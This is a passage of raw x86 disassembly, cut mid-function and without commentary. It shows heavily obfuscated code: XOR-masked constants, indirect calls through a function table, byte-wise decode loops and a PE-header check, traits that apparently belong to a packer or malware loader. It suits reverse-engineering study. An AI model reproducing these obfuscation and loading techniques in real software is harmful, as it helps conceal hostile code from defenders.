  4209e5:	mov    BYTE PTR [ebp-0x2],cl
  4209e8:	mov    al,BYTE PTR [ebp-0x2]
  4209eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4209ee:	mov    edx,DWORD PTR [ebp-0x48]
  4209f1:	xor    ecx,ebx
  4209f3:	add    ecx,esi
  4209f5:	imul   ecx,edx
  4209f8:	mov    edx,DWORD PTR [ebp-0x8]
  4209fb:	mov    BYTE PTR [ecx+edx*1],al
  4209fe:	mov    eax,DWORD PTR [ebp-0x1c]
  420a01:	mov    ecx,DWORD PTR [ebp-0x48]
  420a04:	xor    eax,ebx
  420a06:	add    eax,esi
  420a08:	imul   eax,ecx
  420a0b:	mov    ecx,DWORD PTR [ebp-0x8]
  420a0e:	mov    al,BYTE PTR [eax+ecx*1]
  420a11:	mov    BYTE PTR [ebp-0x2],al
  420a14:	mov    eax,DWORD PTR [ebp-0x1c]
  420a17:	mov    ecx,DWORD PTR [ebp-0x48]
  420a1a:	xor    eax,ebx
  420a1c:	add    eax,esi
  420a1e:	imul   eax,ecx
  420a21:	mov    ecx,DWORD PTR [ebp-0x20]
  420a24:	xor    ecx,ebx
  420a26:	add    eax,ecx
  420a28:	mov    ecx,DWORD PTR [ebp-0x8]
  420a2b:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420a33:	mov    ecx,DWORD PTR [ebp-0xc4]
  420a39:	xor    ecx,ebx
  420a3b:	lea    eax,[ecx+eax*1+0x3272fa]
  420a42:	movzx  ecx,BYTE PTR [ebp-0x2]
  420a46:	xor    ecx,eax
  420a48:	mov    BYTE PTR [ebp-0x2],cl
  420a4b:	mov    al,BYTE PTR [ebp-0x2]
  420a4e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420a51:	mov    edx,DWORD PTR [ebp-0x48]
  420a54:	xor    ecx,ebx
  420a56:	add    ecx,esi
  420a58:	imul   ecx,edx
  420a5b:	mov    edx,DWORD PTR [ebp-0x8]
  420a5e:	mov    BYTE PTR [ecx+edx*1],al
  420a61:	mov    eax,DWORD PTR [ebp-0x38]
  420a64:	mov    ecx,DWORD PTR [ebp-0x20]
  420a67:	xor    eax,ebx
  420a69:	xor    ecx,ebx
  420a6b:	add    eax,esi
  420a6d:	add    ecx,esi
  420a6f:	imul   eax,ecx
  420a72:	add    eax,DWORD PTR [ebp-0x48]
  420a75:	mov    DWORD PTR [ebp-0x48],eax
  420a78:	mov    eax,DWORD PTR [ebp-0x48]
  420a7b:	mov    ecx,DWORD PTR [ebp-0x14]
  420a7e:	cmp    ecx,eax
  420a80:	jb     0x420984
  420a86:	mov    eax,DWORD PTR [ebp-0x20]
  420a89:	mov    ecx,DWORD PTR [ebp-0x14]
  420a8c:	xor    eax,ebx
  420a8e:	add    eax,esi
  420a90:	imul   eax,ecx
  420a93:	mov    ecx,DWORD PTR [ebp-0x24]
  420a96:	xor    ecx,ebx
  420a98:	add    ecx,esi
  420a9a:	or     eax,ecx
  420a9c:	mov    ecx,DWORD PTR [ebp-0x30]
  420a9f:	xor    ecx,ebx
  420aa1:	add    eax,ecx
  420aa3:	mov    ecx,DWORD PTR [ebp-0x30]
  420aa6:	xor    ecx,ebx
  420aa8:	add    eax,ecx
  420aaa:	mov    ecx,DWORD PTR [ebp-0xc]
  420aad:	lea    eax,[eax+ecx*1+0x64e5f4]
  420ab4:	jmp    0x420ac5
  420ab6:	mov    eax,DWORD PTR [ebp-0x30]
  420ab9:	mov    ecx,DWORD PTR [ebp-0xc]
  420abc:	xor    eax,ebx
  420abe:	lea    eax,[eax+ecx*1+0x3272fa]
  420ac5:	mov    DWORD PTR [ebp-0xc],eax
  420ac8:	mov    eax,DWORD PTR [ebp-0x30]
  420acb:	xor    eax,ebx
  420acd:	mov    ecx,0xffcd8d06
  420ad2:	sub    ecx,eax
  420ad4:	add    ecx,DWORD PTR [ebp-0x28]
  420ad7:	mov    eax,DWORD PTR [ebp-0x30]
  420ada:	mov    edx,DWORD PTR [ebp-0xc]
  420add:	xor    eax,ebx
  420adf:	add    eax,esi
  420ae1:	imul   eax,edx
  420ae4:	cmp    eax,ecx
  420ae6:	jbe    0x4208f8
  420aec:	mov    eax,DWORD PTR [ebp-0x10]
  420aef:	mov    ecx,DWORD PTR [ebp-0x3c]
  420af2:	mov    eax,DWORD PTR [ebp+0x8]
  420af5:	mov    edx,DWORD PTR [ebp-0x54]
  420af8:	mov    eax,DWORD PTR [eax+0x1e0]
  420afe:	xor    edx,ebx
  420b00:	add    edx,esi
  420b02:	push   edx
  420b03:	mov    edx,DWORD PTR [ebp-0x40]
  420b06:	xor    edx,ebx
  420b08:	add    edx,esi
  420b0a:	push   edx
  420b0b:	push   ecx
  420b0c:	mov    DWORD PTR [ebp-0x38],ecx
  420b0f:	mov    ecx,DWORD PTR [ebp-0x10]
  420b12:	xor    ecx,ebx
  420b14:	add    ecx,esi
  420b16:	push   ecx
  420b17:	call   DWORD PTR [eax+0x14]
  420b1a:	mov    edi,eax
  420b1c:	mov    eax,DWORD PTR [ebp-0x10]
  420b1f:	xor    eax,ebx
  420b21:	add    eax,esi
  420b23:	cmp    eax,edi
  420b25:	je     0x420b80
  420b27:	mov    eax,DWORD PTR [ebp-0x10]
  420b2a:	jmp    0x420b4d
  420b2c:	mov    ecx,DWORD PTR [ebp-0x2c]
  420b2f:	xor    eax,ebx
  420b31:	mov    cl,BYTE PTR [ecx+eax*1+0x3272fa]
  420b38:	mov    BYTE PTR [eax+edi*1+0x3272fa],cl
  420b3f:	mov    ecx,DWORD PTR [ebp-0x18]
  420b42:	xor    ecx,ebx
  420b44:	lea    eax,[ecx+eax*1+0x3272fa]
  420b4b:	xor    eax,ebx
  420b4d:	mov    ecx,DWORD PTR [ebp-0x3c]
  420b50:	sub    ecx,esi
  420b52:	xor    ecx,ebx
  420b54:	cmp    eax,ecx
  420b56:	jne    0x420b2c
  420b58:	mov    eax,DWORD PTR [ebp+0x8]
  420b5b:	mov    ecx,DWORD PTR [ebp-0x50]
  420b5e:	mov    eax,DWORD PTR [eax+0x1e0]
  420b64:	xor    ecx,ebx
  420b66:	add    ecx,esi
  420b68:	push   ecx
  420b69:	mov    ecx,DWORD PTR [ebp-0x10]
  420b6c:	xor    ecx,ebx
  420b6e:	add    ecx,esi
  420b70:	push   ecx
  420b71:	push   DWORD PTR [ebp-0x2c]
  420b74:	call   DWORD PTR [eax+0x18]
  420b77:	mov    eax,DWORD PTR [ebp-0x38]
  420b7a:	mov    DWORD PTR [ebp-0x2c],edi
  420b7d:	mov    DWORD PTR [ebp-0x3c],eax
  420b80:	mov    eax,DWORD PTR [ebp-0x2c]
  420b83:	mov    DWORD PTR [ebp-0x14],eax
  420b86:	mov    eax,DWORD PTR [ebp-0x18]
  420b89:	mov    ecx,DWORD PTR [ebp-0x10]
  420b8c:	xor    eax,ebx
  420b8e:	add    eax,esi
  420b90:	mov    DWORD PTR [ebp-0x5c],0xbad3cbd3
  420b97:	mov    DWORD PTR [ebp-0x58],0xc4d3bcd3
  420b9e:	jmp    0x420bd1
  420ba0:	mov    edx,DWORD PTR [ebp-0x14]
  420ba3:	mov    edi,ecx
  420ba5:	xor    edi,ebx
  420ba7:	mov    cl,BYTE PTR [ebp+edi*1+0x32729e]
  420bae:	movsx  edx,BYTE PTR [edi+edx*1+0x3272fa]
  420bb6:	xor    cl,0x81
  420bb9:	add    cl,0x6
  420bbc:	movzx  ecx,cl
  420bbf:	cmp    edx,ecx
  420bc1:	jne    0x420bdb
  420bc3:	mov    ecx,DWORD PTR [ebp-0x18]
  420bc6:	xor    ecx,ebx
  420bc8:	lea    ecx,[ecx+edi*1+0x3272fa]
  420bcf:	xor    ecx,ebx
  420bd1:	cmp    ecx,0xf89c85bd
  420bd7:	jne    0x420ba0
  420bd9:	jmp    0x420be2
  420bdb:	mov    eax,DWORD PTR [ebp-0x10]
  420bde:	xor    eax,ebx
  420be0:	add    eax,esi
  420be2:	mov    ecx,DWORD PTR [ebp-0x10]
  420be5:	xor    ecx,ebx
  420be7:	add    ecx,esi
  420be9:	cmp    ecx,eax
  420beb:	je     0x420d61
  420bf1:	mov    eax,DWORD PTR [ebp-0x14]
  420bf4:	mov    eax,DWORD PTR [eax+0x8]
  420bf7:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  420bfe:	mov    DWORD PTR [ebp-0x40],0xf89cc3c6
  420c05:	mov    DWORD PTR [ebp-0x44],0xf89cb5b5
  420c0c:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  420c13:	mov    DWORD PTR [ebp-0x20],eax
  420c16:	mov    eax,DWORD PTR [ebp+0x8]
  420c19:	mov    ecx,DWORD PTR [ebp-0x24]
  420c1c:	xor    ecx,ebx
  420c1e:	add    ecx,esi
  420c20:	push   ecx
  420c21:	mov    ecx,DWORD PTR [ebp-0x44]
  420c24:	mov    eax,DWORD PTR [eax+0x1e0]
  420c2a:	xor    ecx,ebx
  420c2c:	add    ecx,esi
  420c2e:	push   ecx
  420c2f:	mov    ecx,DWORD PTR [ebp-0x40]
  420c32:	xor    ecx,ebx
  420c34:	add    ecx,esi
  420c36:	push   ecx
  420c37:	mov    ecx,DWORD PTR [ebp-0xc]
  420c3a:	xor    ecx,ebx
  420c3c:	add    ecx,esi
  420c3e:	push   ecx
  420c3f:	call   DWORD PTR [eax+0x14]
  420c42:	mov    edi,eax
  420c44:	mov    eax,DWORD PTR [ebp+0x8]
  420c47:	mov    ecx,DWORD PTR [ebp-0x24]
  420c4a:	mov    eax,DWORD PTR [eax+0x1e0]
  420c50:	xor    ecx,ebx
  420c52:	add    ecx,esi
  420c54:	push   ecx
  420c55:	mov    ecx,DWORD PTR [ebp-0x44]
  420c58:	xor    ecx,ebx
  420c5a:	add    ecx,esi
  420c5c:	push   ecx
  420c5d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c60:	push   DWORD PTR [ebp-0x20]
  420c63:	xor    ecx,ebx
  420c65:	add    ecx,esi
  420c67:	push   ecx
  420c68:	call   DWORD PTR [eax+0x14]
  420c6b:	mov    ecx,DWORD PTR [ebp-0xc]
  420c6e:	xor    ecx,ebx
  420c70:	add    ecx,esi
  420c72:	mov    DWORD PTR [ebp-0x24],eax
  420c75:	cmp    ecx,edi
  420c77:	je     0x421004
  420c7d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c80:	xor    ecx,ebx
  420c82:	add    ecx,esi
  420c84:	cmp    ecx,eax
  420c86:	je     0x421004
  420c8c:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  420c93:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420c9a:	mov    ecx,DWORD PTR [ebp-0x40]
  420c9d:	xor    cl,0xb3
  420ca0:	sub    cl,0x6
  420ca3:	mov    BYTE PTR [edi],cl
  420ca5:	mov    ecx,DWORD PTR [ebp-0xc]
  420ca8:	xor    cl,0xb3
  420cab:	sub    cl,0x6
  420cae:	mov    BYTE PTR [edi+0x1],cl
  420cb1:	mov    ecx,DWORD PTR [ebp-0x54]
  420cb4:	xor    cl,0xb3
  420cb7:	sub    cl,0x6
  420cba:	mov    BYTE PTR [edi+0x2],cl
  420cbd:	and    DWORD PTR [ebp-0xc8],0x0
  420cc4:	and    DWORD PTR [ebp-0xdc],0x0
  420ccb:	lea    ecx,[ebp-0xdc]
  420cd1:	push   ecx
  420cd2:	push   DWORD PTR [ebp-0x20]
  420cd5:	push   eax
  420cd6:	lea    eax,[ebp-0xc8]
  420cdc:	push   eax
  420cdd:	mov    eax,DWORD PTR [ebp-0x14]
  420ce0:	push   DWORD PTR [eax+0xc]
  420ce3:	mov    eax,DWORD PTR [ebp-0x2c]
  420ce6:	add    eax,0x10
  420ce9:	push   eax
  420cea:	push   edi
  420ceb:	call   0x41ff8f
  420cf0:	mov    DWORD PTR [ebp-0x40],eax
  420cf3:	mov    eax,DWORD PTR [ebp+0x8]
  420cf6:	mov    ecx,DWORD PTR [ebp-0x50]
  420cf9:	mov    eax,DWORD PTR [eax+0x1e0]
  420cff:	xor    ecx,ebx
  420d01:	add    ecx,esi
  420d03:	push   ecx
  420d04:	mov    ecx,DWORD PTR [ebp-0xc]
  420d07:	xor    ecx,ebx
  420d09:	add    ecx,esi
  420d0b:	push   ecx
  420d0c:	push   edi
  420d0d:	call   DWORD PTR [eax+0x18]
  420d10:	mov    eax,DWORD PTR [ebp-0x40]
  420d13:	add    eax,0xffcd8d06
  420d18:	xor    eax,ebx
  420d1a:	cmp    eax,0xf89c85b5
  420d1f:	mov    eax,DWORD PTR [ebp+0x8]
  420d22:	mov    eax,DWORD PTR [eax+0x1e0]
  420d28:	mov    ecx,DWORD PTR [ebp-0x50]
  420d2b:	jne    0x420d4e
  420d2d:	xor    ecx,ebx
  420d2f:	add    ecx,esi
  420d31:	push   ecx
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	xor    ecx,ebx
  420d37:	add    ecx,esi
  420d39:	push   ecx
  420d3a:	push   DWORD PTR [ebp-0x2c]
  420d3d:	call   DWORD PTR [eax+0x18]
  420d40:	mov    eax,DWORD PTR [ebp-0x24]
  420d43:	mov    DWORD PTR [ebp-0x2c],eax
  420d46:	mov    eax,DWORD PTR [ebp-0x20]
  420d49:	mov    DWORD PTR [ebp-0x3c],eax
  420d4c:	jmp    0x420d61
  420d4e:	xor    ecx,ebx
  420d50:	add    ecx,esi
  420d52:	push   ecx
  420d53:	mov    ecx,DWORD PTR [ebp-0xc]
  420d56:	xor    ecx,ebx
  420d58:	add    ecx,esi
  420d5a:	push   ecx
  420d5b:	push   DWORD PTR [ebp-0x24]
  420d5e:	call   DWORD PTR [eax+0x18]
  420d61:	mov    eax,DWORD PTR [ebp-0x3c]
  420d64:	mov    DWORD PTR [ebp-0x34],eax
  420d67:	mov    eax,DWORD PTR [ebp-0x2c]
  420d6a:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  420d71:	mov    DWORD PTR [ebp-0x40],eax
  420d74:	mov    edi,0xf89c85b4
  420d79:	mov    DWORD PTR [ebp-0x30],edi
  420d7c:	mov    eax,DWORD PTR [ebp-0x28]
  420d7f:	xor    eax,ebx
  420d81:	add    eax,esi
  420d83:	mov    DWORD PTR [ebp-0xc],eax
  420d86:	mov    eax,DWORD PTR [ebp-0x28]
  420d89:	xor    eax,ebx
  420d8b:	add    eax,esi
  420d8d:	mov    DWORD PTR [ebp-0x14],eax
  420d90:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  420d97:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  420d9e:	mov    eax,DWORD PTR [ebp-0x28]
  420da1:	mov    ecx,DWORD PTR [ebp-0x34]
  420da4:	xor    eax,ebx
  420da6:	add    eax,esi
  420da8:	cmp    ecx,eax
  420daa:	je     0x420fa0
  420db0:	jmp    0x420f7c
  420db5:	mov    ecx,DWORD PTR [ebp-0xc]
  420db8:	mov    eax,DWORD PTR [ebp-0x34]
  420dbb:	sub    eax,ecx
  420dbd:	mov    ecx,DWORD PTR [ebp-0x44]
  420dc0:	xor    ecx,ebx
  420dc2:	add    ecx,esi
  420dc4:	xor    edx,edx
  420dc6:	div    ecx
  420dc8:	mov    DWORD PTR [ebp-0x14],eax
  420dcb:	mov    eax,DWORD PTR [ebp-0x24]
  420dce:	mov    ecx,DWORD PTR [ebp-0x14]
  420dd1:	xor    eax,ebx
  420dd3:	add    eax,esi
  420dd5:	cmp    ecx,eax
  420dd7:	jbe    0x420de3
  420dd9:	mov    eax,DWORD PTR [ebp-0x24]
  420ddc:	xor    eax,ebx
  420dde:	add    eax,esi
  420de0:	mov    DWORD PTR [ebp-0x14],eax
  420de3:	mov    eax,DWORD PTR [ebp-0x44]
  420de6:	mov    ecx,DWORD PTR [ebp-0x14]
  420de9:	xor    eax,ebx
  420deb:	add    eax,esi
  420ded:	imul   eax,ecx
  420df0:	mov    DWORD PTR [ebp-0x14],eax
  420df3:	mov    eax,DWORD PTR [ebp-0x28]
  420df6:	mov    ecx,DWORD PTR [ebp-0x14]
  420df9:	xor    eax,ebx
  420dfb:	add    eax,esi
  420dfd:	cmp    ecx,eax
  420dff:	je     0x420f6a
  420e05:	mov    eax,DWORD PTR [ebp-0x14]
  420e08:	mov    DWORD PTR [ebp-0x20],eax
  420e0b:	mov    eax,DWORD PTR [ebp-0xc]
  420e0e:	add    eax,DWORD PTR [ebp-0x40]
  420e11:	mov    DWORD PTR [ebp-0x4c],0xf89c85b5
  420e18:	mov    DWORD PTR [ebp-0x14],edi
  420e1b:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420e22:	mov    DWORD PTR [ebp-0x1c],eax
  420e25:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420e2c:	mov    DWORD PTR [ebp-0x8],edi
  420e2f:	mov    eax,DWORD PTR [ebp-0x4c]
  420e32:	xor    eax,ebx
  420e34:	add    eax,esi
  420e36:	jmp    0x420f29
  420e3b:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  420e45:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  420e4f:	mov    eax,DWORD PTR [ebp-0x8]
  420e52:	mov    ecx,DWORD PTR [ebp-0x18]
  420e55:	xor    eax,ebx
  420e57:	add    eax,esi
  420e59:	imul   eax,ecx
  420e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e5f:	mov    al,BYTE PTR [eax+ecx*1]
  420e62:	mov    BYTE PTR [ebp-0x1],al
  420e65:	mov    eax,DWORD PTR [ebp-0x8]
  420e68:	mov    ecx,DWORD PTR [ebp-0x18]
  420e6b:	xor    eax,ebx
  420e6d:	add    eax,esi
  420e6f:	imul   eax,ecx
  420e72:	mov    ecx,DWORD PTR [ebp-0x54]
  420e75:	xor    ecx,ebx
  420e77:	add    eax,ecx
  420e79:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e7c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420e84:	mov    ecx,DWORD PTR [ebp-0xe4]
  420e8a:	xor    ecx,ebx
  420e8c:	lea    eax,[ecx+eax*1+0x3272fa]
  420e93:	movzx  ecx,BYTE PTR [ebp-0x1]
  420e97:	xor    ecx,eax
  420e99:	mov    BYTE PTR [ebp-0x1],cl
  420e9c:	mov    al,BYTE PTR [ebp-0x1]
  420e9f:	mov    ecx,DWORD PTR [ebp-0x8]
  420ea2:	mov    edx,DWORD PTR [ebp-0x18]
  420ea5:	xor    ecx,ebx
  420ea7:	add    ecx,esi
  420ea9:	imul   ecx,edx
  420eac:	mov    edx,DWORD PTR [ebp-0x1c]
  420eaf:	mov    BYTE PTR [ecx+edx*1],al
  420eb2:	mov    eax,DWORD PTR [ebp-0x8]
  420eb5:	mov    ecx,DWORD PTR [ebp-0x18]
  420eb8:	xor    eax,ebx
  420eba:	add    eax,esi
  420ebc:	imul   eax,ecx
  420ebf:	mov    ecx,DWORD PTR [ebp-0x1c]
  420ec2:	mov    al,BYTE PTR [eax+ecx*1]
  420ec5:	mov    BYTE PTR [ebp-0x1],al
  420ec8:	mov    eax,DWORD PTR [ebp-0x8]
  420ecb:	mov    ecx,DWORD PTR [ebp-0x18]
  420ece:	xor    eax,ebx
  420ed0:	add    eax,esi
  420ed2:	imul   eax,ecx
  420ed5:	mov    ecx,DWORD PTR [ebp-0x14]
  420ed8:	xor    ecx,ebx
  420eda:	add    eax,ecx
  420edc:	mov    ecx,DWORD PTR [ebp-0x1c]
  420edf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420ee7:	mov    ecx,DWORD PTR [ebp-0xd0]
  420eed:	xor    ecx,ebx
  420eef:	lea    eax,[ecx+eax*1+0x3272fa]
  420ef6:	movzx  ecx,BYTE PTR [ebp-0x1]
  420efa:	xor    ecx,eax
  420efc:	mov    BYTE PTR [ebp-0x1],cl
  420eff:	mov    al,BYTE PTR [ebp-0x1]
  420f02:	mov    ecx,DWORD PTR [ebp-0x8]
  420f05:	mov    edx,DWORD PTR [ebp-0x18]
  420f08:	xor    ecx,ebx
  420f0a:	add    ecx,esi
  420f0c:	imul   ecx,edx
  420f0f:	mov    edx,DWORD PTR [ebp-0x1c]
  420f12:	mov    BYTE PTR [ecx+edx*1],al
  420f15:	mov    eax,DWORD PTR [ebp-0x38]
  420f18:	mov    ecx,DWORD PTR [ebp-0x14]
  420f1b:	xor    eax,ebx
  420f1d:	xor    ecx,ebx
  420f1f:	add    eax,esi
  420f21:	add    ecx,esi
  420f23:	imul   eax,ecx
  420f26:	add    eax,DWORD PTR [ebp-0x18]
  420f29:	mov    DWORD PTR [ebp-0x18],eax
  420f2c:	mov    eax,DWORD PTR [ebp-0x18]
  420f2f:	mov    ecx,DWORD PTR [ebp-0x20]
  420f32:	cmp    ecx,eax
  420f34:	jb     0x420e3b
  420f3a:	mov    eax,DWORD PTR [ebp-0x14]
  420f3d:	mov    ecx,DWORD PTR [ebp-0x20]
  420f40:	xor    eax,ebx
  420f42:	add    eax,esi
  420f44:	imul   eax,ecx
  420f47:	mov    ecx,DWORD PTR [ebp-0x4c]
  420f4a:	xor    ecx,ebx
  420f4c:	add    ecx,esi
  420f4e:	or     eax,ecx
  420f50:	mov    ecx,DWORD PTR [ebp-0x30]
  420f53:	xor    ecx,ebx
  420f55:	add    eax,ecx
  420f57:	mov    ecx,DWORD PTR [ebp-0x30]
  420f5a:	xor    ecx,ebx
  420f5c:	add    eax,ecx
  420f5e:	mov    ecx,DWORD PTR [ebp-0xc]
  420f61:	lea    eax,[eax+ecx*1+0x64e5f4]
  420f68:	jmp    0x420f79
  420f6a:	mov    eax,DWORD PTR [ebp-0x30]
  420f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  420f70:	xor    eax,ebx
  420f72:	lea    eax,[eax+ecx*1+0x3272fa]
  420f79:	mov    DWORD PTR [ebp-0xc],eax
  420f7c:	mov    eax,DWORD PTR [ebp-0x30]
  420f7f:	xor    eax,ebx
  420f81:	mov    ecx,0xffcd8d06
  420f86:	sub    ecx,eax
  420f88:	add    ecx,DWORD PTR [ebp-0x34]
  420f8b:	mov    eax,DWORD PTR [ebp-0x30]
  420f8e:	mov    edx,DWORD PTR [ebp-0xc]
  420f91:	xor    eax,ebx
  420f93:	add    eax,esi
  420f95:	imul   eax,edx
  420f98:	cmp    eax,ecx
  420f9a:	jbe    0x420db5
  420fa0:	push   DWORD PTR [ebp+0x8]
  420fa3:	mov    eax,DWORD PTR [ebp+0x8]
  420fa6:	push   DWORD PTR [eax+0x1cc]
  420fac:	lea    eax,[ebp-0xd8]
  420fb2:	push   eax
  420fb3:	mov    eax,DWORD PTR [ebp+0x8]
  420fb6:	mov    eax,DWORD PTR [eax+0x1c4]
  420fbc:	push   DWORD PTR [eax]
  420fbe:	mov    eax,DWORD PTR [ebp+0x8]
  420fc1:	mov    eax,DWORD PTR [eax+0x1c0]
  420fc7:	push   DWORD PTR [eax]
  420fc9:	push   DWORD PTR [ebp-0x3c]
  420fcc:	push   DWORD PTR [ebp-0x2c]
  420fcf:	call   0x421a66
  420fd4:	mov    DWORD PTR [ebp-0x40],eax
  420fd7:	mov    eax,DWORD PTR [ebp-0x10]
  420fda:	mov    ecx,DWORD PTR [ebp-0x2c]
  420fdd:	xor    eax,ebx
  420fdf:	add    eax,esi
  420fe1:	cmp    eax,ecx
  420fe3:	je     0x421004
  420fe5:	mov    eax,DWORD PTR [ebp+0x8]
  420fe8:	mov    ecx,DWORD PTR [ebp-0x50]
  420feb:	mov    eax,DWORD PTR [eax+0x1e0]
  420ff1:	xor    ecx,ebx
  420ff3:	add    ecx,esi
  420ff5:	push   ecx
  420ff6:	mov    ecx,DWORD PTR [ebp-0x10]
  420ff9:	xor    ecx,ebx
  420ffb:	add    ecx,esi
  420ffd:	push   ecx
  420ffe:	push   DWORD PTR [ebp-0x2c]
  421001:	call   DWORD PTR [eax+0x18]
  421004:	pop    edi
  421005:	pop    esi
  421006:	pop    ebx
  421007:	leave  
  421008:	ret    0x4
  42100b:	push   ebp
  42100c:	mov    ebp,esp
  42100e:	push   ecx
  42100f:	push   ecx
  421010:	lea    eax,[ebp-0x8]
  421013:	mov    DWORD PTR [ebp-0x4],eax
  421016:	push   esi
  421017:	mov    esi,DWORD PTR [ebp-0x4]
  42101a:	mov    eax,0xf881bacf
  42101f:	mov    DWORD PTR [esi],eax
  421021:	mov    esi,DWORD PTR [ebp-0x8]
  421024:	cmp    esi,eax
  421026:	pop    esi
  421027:	jne    0x421031
  421029:	mov    BYTE PTR [ecx+0xa],0x7b
  42102d:	mov    BYTE PTR [edx+0x8],0xcc
  421031:	mov    BYTE PTR [edx+0xa],0x7b
  421035:	mov    BYTE PTR [ecx+0x2],0xe9
  421039:	leave  
  42103a:	ret    
  42103b:	push   ebp
  42103c:	mov    ebp,esp
  42103e:	push   ecx
  42103f:	push   ecx
  421040:	lea    eax,[ebp-0x8]
  421043:	mov    DWORD PTR [ebp-0x4],eax
  421046:	mov    edx,DWORD PTR [ebp-0x4]
  421049:	mov    eax,0xf88b0bd3
  42104e:	mov    DWORD PTR [edx],eax
  421050:	mov    edx,DWORD PTR [ebp-0x8]
  421053:	cmp    edx,eax
  421055:	jne    0x421066
  421057:	mov    eax,DWORD PTR [ebp+0x8]
  42105a:	mov    BYTE PTR [ecx+0x9],0xef
  42105e:	mov    BYTE PTR [eax+0x7],0xa4
  421062:	mov    BYTE PTR [ecx+0x6],0xec
  421066:	mov    BYTE PTR [ecx+0x3],0xdf
  42106a:	leave  
  42106b:	ret    0x4
  42106e:	push   ebp
  42106f:	mov    ebp,esp
  421071:	push   ecx
  421072:	push   ecx
  421073:	lea    eax,[ebp-0x8]
  421076:	mov    DWORD PTR [ebp-0x4],eax
  421079:	mov    edx,DWORD PTR [ebp-0x4]
  42107c:	mov    eax,0x7e0dacf
  421081:	mov    DWORD PTR [edx],eax
  421083:	mov    edx,DWORD PTR [ebp-0x8]
  421086:	cmp    edx,eax
  421088:	jne    0x42108e
  42108a:	mov    BYTE PTR [ecx+0x7],0xa4
  42108e:	mov    eax,DWORD PTR [ebp+0x8]
  421091:	mov    BYTE PTR [ecx+0x1],0xe2
  421095:	mov    BYTE PTR [eax+0x9],0xcf
  421099:	leave  
  42109a:	ret    0x4
  42109d:	push   ebp
  42109e:	mov    ebp,esp
  4210a0:	push   ecx
  4210a1:	push   ecx
  4210a2:	lea    eax,[ebp-0x8]
  4210a5:	mov    DWORD PTR [ebp-0x4],eax
  4210a8:	push   esi
  4210a9:	mov    esi,DWORD PTR [ebp-0x4]
  4210ac:	mov    eax,0x7060e3e
  4210b1:	mov    DWORD PTR [esi],eax
  4210b3:	mov    esi,DWORD PTR [ebp-0x8]
  4210b6:	cmp    esi,eax
  4210b8:	pop    esi
  4210b9:	jne    0x4210c5
  4210bb:	mov    BYTE PTR [edx+0x4],0xe8
  4210bf:	mov    WORD PTR [ecx+0x3],0xe8df
  4210c5:	mov    BYTE PTR [edx],0xbc
  4210c8:	leave  
  4210c9:	ret    
  4210ca:	push   ebp
  4210cb:	mov    ebp,esp
  4210cd:	push   ecx
  4210ce:	push   ecx
  4210cf:	lea    eax,[ebp-0x8]
  4210d2:	mov    DWORD PTR [ebp-0x4],eax
  4210d5:	mov    edx,DWORD PTR [ebp-0x4]
  4210d8:	mov    eax,0xf8870b3f
  4210dd:	mov    DWORD PTR [edx],eax
  4210df:	mov    edx,DWORD PTR [ebp-0x8]
  4210e2:	cmp    edx,eax
  4210e4:	jne    0x4210f1
  4210e6:	mov    eax,DWORD PTR [ebp+0x8]
  4210e9:	mov    BYTE PTR [ecx+0x8],0xec
  4210ed:	mov    BYTE PTR [eax+0x1],0xe2
  4210f1:	mov    BYTE PTR [ecx+0x5],0xf0
  4210f5:	leave  
  4210f6:	ret    0x4
  4210f9:	push   esi
  4210fa:	mov    ecx,edi
  4210fc:	call   0x4210ca
  421101:	mov    edx,edi
  421103:	mov    ecx,esi
  421105:	mov    BYTE PTR [esi],0xdc
  421108:	call   0x42109d
  42110d:	push   esi
  42110e:	mov    ecx,edi
  421110:	mov    BYTE PTR [esi+0x5],0xf0
  421114:	call   0x42106e
  421119:	push   esi
  42111a:	mov    BYTE PTR [esi+0x6],0xec
  42111e:	call   0x42103b
  421123:	mov    BYTE PTR [esi+0x2],0xe9
  421127:	mov    edx,esi
  421129:	jmp    0x42100b
  42112e:	push   ebp
  42112f:	mov    ebp,esp
  421131:	push   ecx
  421132:	mov    ecx,DWORD PTR [edx+0x194]
  421138:	push   esi
  421139:	mov    esi,DWORD PTR [ebp+0x8]
  42113c:	mov    esi,DWORD PTR [esi]
  42113e:	mov    DWORD PTR [ecx],esi
  421140:	mov    ecx,DWORD PTR [edx+0x194]
  421146:	mov    ecx,DWORD PTR [ecx]
  421148:	mov    esi,DWORD PTR [edx+0x190]
  42114e:	mov    DWORD PTR [esi],ecx
  421150:	mov    eax,DWORD PTR [edx+0x194]
  421156:	mov    ecx,DWORD PTR [eax]
  421158:	mov    ecx,DWORD PTR [ecx+0x3c]
  42115b:	add    ecx,DWORD PTR [eax]
  42115d:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  421164:	mov    eax,DWORD PTR [ebp-0x4]
  421167:	movzx  ecx,WORD PTR [ecx+0x16]
  42116b:	xor    eax,0x75108b3
  421170:	add    eax,0x3272fa
  421175:	pop    esi
  421176:	test   ecx,eax
  421178:	je     0x421186
  42117a:	mov    eax,DWORD PTR [edx+0x1c8]
  421180:	mov    DWORD PTR [eax],0xf89c85b4
  421186:	leave  
  421187:	ret    0x4
  42118a:	push   ebp
  42118b:	mov    ebp,esp
  42118d:	sub    esp,0x70
  421190:	and    DWORD PTR [ebp-0x20],0x0
  421194:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
